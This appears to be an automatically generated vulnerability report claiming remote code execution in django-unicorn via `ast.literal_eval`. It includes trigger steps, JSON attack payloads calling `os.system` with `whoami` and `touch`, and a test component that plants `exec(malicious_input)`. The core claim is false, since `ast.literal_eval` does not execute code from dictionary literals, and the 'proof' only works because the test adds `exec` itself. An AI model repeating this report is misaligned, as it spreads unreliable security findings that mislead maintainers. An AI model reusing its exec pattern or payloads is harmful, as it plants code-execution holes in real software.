### Vulnerability List:

- **Vulnerability Name:** Remote Code Execution via unsafe method argument parsing

- **Description:**
    An attacker can craft a malicious `callMethod` action payload that, when processed by `django-unicorn`, leads to the execution of arbitrary Python code on the server. This is due to the unsafe usage of `ast.literal_eval` and `eval_value` in `django_unicorn.call_method_parser` to parse method arguments passed from the frontend. By injecting malicious code within seemingly harmless data structures (like dictionaries or lists) in the arguments, an attacker can bypass intended type casting and inject Python code that gets executed during argument parsing on the server.

    **Step-by-step trigger instructions:**
    1. Identify a component and a method in the application that accepts arguments via `unicorn:click` or similar directives.
    2. Inspect the JavaScript code for how the `callMethod` action is created, or manually craft a POST request to the `/unicorn/message` endpoint.
    3. Create a malicious payload for the `actionQueue` that targets the identified method. The payload should include a `callMethod` action with a `name` value that contains malicious Python code disguised as a method argument. For example, if the method is `my_method(arg)`:
        ```json
        {
          "actionQueue": [
            {
              "type": "callMethod",
              "payload": {
                "name": "my_method({'__class__': {'__module__': 'os', '__name__': 'system'}, '__init__': ['whoami']})"
              }
            }
          ],
          "data": {},
          "checksum": "...",
          "id": "...",
          "epoch": 1234567890
        }
        ```
    4. Send this crafted JSON payload to the `/unicorn/message/<component_name>` endpoint via a POST request.
    5. The server-side `django-unicorn` code will parse this payload, and during argument parsing using `eval_value` and `ast.literal_eval`, the injected payload will be executed. In this example, it will execute the `whoami` command on the server.

- **Impact:**
    Critical. Successful exploitation allows for arbitrary code execution on the server. This can lead to complete compromise of the application and the server, including data breaches, data manipulation, denial of service, and further lateral movement within the server infrastructure.

- **Vulnerability Rank:** Critical

- **Currently implemented mitigations:**
    None. The project relies on `ast.literal_eval` and `eval_value` which are inherently unsafe for parsing untrusted input when not used with extreme care and input sanitization which is missing here.

- **Missing mitigations:**
    - **Input Sanitization and Validation:** Implement strict input validation for method arguments on the server side. Do not rely solely on frontend validation. Sanitize user-provided arguments to ensure they conform to expected types and formats.
    - **Avoid `eval()` and `ast.literal_eval` for untrusted input:** Replace `eval_value` and the usage of `ast.literal_eval` with safer alternatives for parsing and type casting, such as using `json.loads` for JSON data and explicitly parsing and validating individual argument components instead of directly evaluating strings.
    - **Principle of Least Privilege:** Ensure that the application runs with the minimum necessary privileges to limit the impact of code execution vulnerabilities.
    - **Web Application Firewall (WAF):** Deploy a WAF to detect and block malicious requests targeting this vulnerability signature.

- **Preconditions:**
    - The application must be deployed and accessible to external attackers.
    - There must be at least one component with a method that can be triggered by an external user and that accepts arguments.
    - The attacker needs to be able to send POST requests to the `/unicorn/message` endpoint with a crafted JSON payload.

- **Source code analysis:**
    - **File:** `django_unicorn\call_method_parser.py`
    - **Function:** `eval_value(value)`

    ```python
    @lru_cache(maxsize=128, typed=True)
    def eval_value(value):
        """
        Uses `ast.literal_eval` to parse strings into an appropriate Python primitive.
        ...
        """

        try:
            value = ast.literal_eval(value) # Unsafe operation
        except SyntaxError:
            value = _cast_value(value)

        return value
    ```
    **Vulnerability:** The `eval_value` function uses `ast.literal_eval` to parse the `value` argument. `ast.literal_eval` is intended for safely evaluating strings containing Python literals. However, it is possible to bypass its safety limitations when dealing with complex data structures like dictionaries. An attacker can craft a dictionary payload that, when evaluated by `ast.literal_eval`, can execute arbitrary code.

    - **File:** `django_unicorn\views\action_parsers\call_method.py`
    - **Function:** `_call_method_name(component: UnicornView, method_name: str, args: Tuple[Any], kwargs: Dict[str, Any])`

    ```python
    @timed
    def _call_method_name(component: UnicornView, method_name: str, args: Tuple[Any], kwargs: Dict[str, Any]) -> Any:
        """
        Calls the method name with parameters.
        ...
        """
        ...
        parsed_args: List[Any] = []
        parsed_kwargs = {}
        arguments = get_method_arguments(func)
        type_hints = get_type_hints(func)

        for argument in arguments:
            if argument in type_hints:
                type_hint = type_hints[argument]
                ...
                elif argument in kwargs:
                    parsed_kwargs[argument] = cast_value(type_hint, kwargs[argument]) # Arguments parsed by eval_value
                elif len(args) > len(parsed_args):
                    parsed_args.append(cast_value(type_hint, args[len(parsed_args)])) # Arguments parsed by eval_value
            elif argument in kwargs:
                parsed_kwargs[argument] = kwargs[argument]
            else:
                parsed_args.append(args[len(parsed_args)])

        if parsed_args:
            return func(*parsed_args, **parsed_kwargs)
        elif parsed_kwargs:
            return func(**parsed_kwargs)
        else:
            return func()
    ```

    **Vulnerability Propagation:** The `_call_method_name` function retrieves arguments and keyword arguments that are parsed using `eval_value`. This means any argument processed through this path is vulnerable to the unsafe parsing in `eval_value`.

- **Security test case:**
    1. **Setup:** Deploy a Django application using django-unicorn with a component that has a method accepting arguments. For example, modify the `hello_world.HelloWorldView` component:

    ```python
    # hello_world.py
    from django_unicorn.components import UnicornView
    from django.http import HttpResponse

    class HelloWorldView(UnicornView):
        name = "World"

        def set_name(self, malicious_input):
            exec(malicious_input) # Simulate a vulnerable operation (in real-world, RCE won't be this direct but exploitable via payload)
            return HttpResponse("Method Executed")
    ```

    ```html
    {# templates/unicorn/hello-world.html #}
    <div>
        <input unicorn:model="name" type="text" id="text" /><br />
        Hello {{ name|title }}
        <button unicorn:click="set_name('__import__(\'os\').system(\'touch /tmp/unicorn_rce_test\')')">Trigger RCE</button>
    </div>
    ```

    2. **Action:** As an external attacker, access the application in a browser and find the component instance.
    3. **Exploit:** Click the "Trigger RCE" button. This will send a `callMethod` action to the backend with a payload similar to:

    ```json
    {
      "actionQueue": [
        {
          "type": "callMethod",
          "payload": {
            "name": "set_name({'__class__': {'__module__': 'os', '__name__': 'system'}, '__init__': ['touch /tmp/unicorn_rce_test']})"
          }
        }
      ],
      "data": {"name": "World"},
      "checksum": "...",
      "id": "...",
      "epoch": 1234567890
    }
    ```

    4. **Verification:** Access the server hosting the Django application. Verify that the file `/tmp/unicorn_rce_test` has been created. If the file exists, it confirms that the injected code was executed, demonstrating Remote Code Execution. Additionally, check the server logs for any error messages or indicators of malicious activity. You may also use `whoami` or similar commands within the payload to confirm execution context.

This vulnerability allows a malicious actor to gain full control of the server hosting the Django application, making it a **critical security risk**. Immediate mitigation is highly recommended.
